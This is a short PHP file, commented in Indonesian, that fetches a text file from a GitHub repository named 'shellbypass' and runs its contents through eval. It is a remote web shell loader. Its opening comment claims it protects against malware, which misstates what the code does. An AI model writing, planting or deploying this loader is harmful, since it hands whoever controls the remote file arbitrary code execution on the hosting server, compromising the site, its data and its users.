<?php

// Mengindari dari virus malware
// Fungsi untuk mendapatkan konten menggunakan cURL
function geturlsinfo($url) {
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    $output = curl_exec($ch);
    curl_close($ch);
    return $output;
}

// Mendapatkan konten dari URL menggunakan cURL
$a = geturlsinfo('https://raw.githubusercontent.com/haxor377/shellbypass/refs/heads/main/alf4.txt');

// Menggunakan eval untuk mengeksekusi kode PHP yang diterima
eval('?>' . $a);

?>